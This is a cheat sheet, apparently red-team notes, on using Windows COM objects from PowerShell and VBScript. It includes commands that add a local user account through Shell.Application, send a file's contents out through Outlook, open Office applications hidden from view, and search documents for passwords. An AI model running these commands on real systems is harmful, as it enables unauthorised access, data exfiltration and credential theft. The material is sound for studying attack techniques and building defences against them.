# COM objects
---
# Navigation
- **[List all COM objects](#list-all-com-objects)**
- **[invoke COM objects](#invoke-com-objects)**
- **[Using VBScript to create COM objects](#using-vbscript-to-create-com-objects)**
- **[Automating sending emails via Outlook](#automating-sending-emails-via-outlook)**
- **[Automating Microsoft Excel using COM](#automating-microsoft-excel-using-com)**
- **[Searching through Office documents using COM automation](#searching-through-office-documents-using-com-automation)**
---
## List all COM objects
```powershell
# One-liner from stackoverflow
gci HKLM:\Software\Classes -ea 0| ? {$_.PSChildName -match '^\w+\.\w+$' -and (gp "$($_.PSPath)\CLSID" -ea 0)} | ft PSChildName
```
## invoke COM objects
```powershell
$shell = New-Object -com Shell.Application
```
- List objects
```powershell
$shell | Get-Member
```
- Invoke commands (examples)
```powershell
$shell.Open("c:\windows")
$shell.ShellExecute("net","user abuqasem s3cretP@WD /add")
$shell.ShellExecute("net","user abuqasem /del")
```
## Using VBScript to create COM objects
Using VBScript, we can also create COM objects and interact with them with just a few lines of code. VBScript is commonly used by **real-world malware**
1. Create a file using your favorite text editor and name it **comdemo.vbs**.
2. Then add the following two lines to the file:
```powershell
set shell = CreateObject("Shell.Application")
shell.Open("c:")
```
3. Save the file and execute it via cscript:
```powershell
cscript.exe comdemo.vbs
#or -> . ./comdemo.vbs
```
5. If everything worked as expected, you will see an Explorer Shell pop up.

## Automating sending emails via Outlook
- Making sure it's running
```powershell
$isRunning = Get-Process | where {$_.ProcessName -eq "outlook"} ; if ($isRunning -eq $null) { Start-Process Outlook -WindowStyle Hidden }
```
- Sending mail
```powershell
$to = ""
$subject = "Secret Document"
$content = cat secretfile.txt
$outlook = new-object -com Outlook.Application
$mail = $outlook.CreateItem(0)
$mail.subject = $subject
$mail.To = $to
$mail.HTMLBody = $content
$mail.Send()
```
- Searching inboxes for passwords and secrets
```powershell
# TODO !
```
## Automating Microsoft Excel using COM
The preceding commands will launch Excel and show it on the desktop if we set **Visible = $true**. If you want to have the application stay unnoticed by the user, keep the default as **Visible = $false**.
```powershell
$excel = new-object -com Excel.Application
$excel.Visible = $true
```
Next, let's add a workbook to the newly opened Excel application and write content into the sheet:
```powershell
$workbook = $excel.Workbooks.Add()
$cell = $workbook.ActiveSheet.Cells(1,1)
$cell.Value = "Here goes the secret message!"
$workbook.Password = "Test"
$workbook.SaveAs("HomefieldAdvantage")
$workbook.Close()
$excel.Quit()
```
We can combine the Outlook and Excel examples by sending the password-protected file over email using the following snippet:
```powershell
$to = ""
$subject = "Secret Document"
$content = "Important message attached."
$outlook = new-object -com Outlook.Application
$mail = $outlook.CreateItem(0)
$mail.Attachments.Add("HomefieldAdvantage")
$mail.subject = $subject
$mail.To = $to
$mail.HTMLBody = $content
$mail.Send()
```
> Alternatively you can use Excel's built-in sendmail: https://docs.microsoft.com/en-us/office/vba/api/excel.workbook.sendmail

## Searching through Office documents using COM automation
- Searching through word docs for passwords using [**Search-Word**](https://github.com/wunderwuzzi23/searchutils/blob/master/Search-OfficeDocuments.ps1)
```powershell
Search-Word <Document> -Pattern "<Filter>" | Format-Table
# Search recursively
gci -recurse *.docx | Search-Word -Pattern "<Filter>" | Format-Table

# By default the filter value is: "password"
```
Same goes for  **`Search-OfficeDocuments`** and **`Search-Excel`** functions in the script above.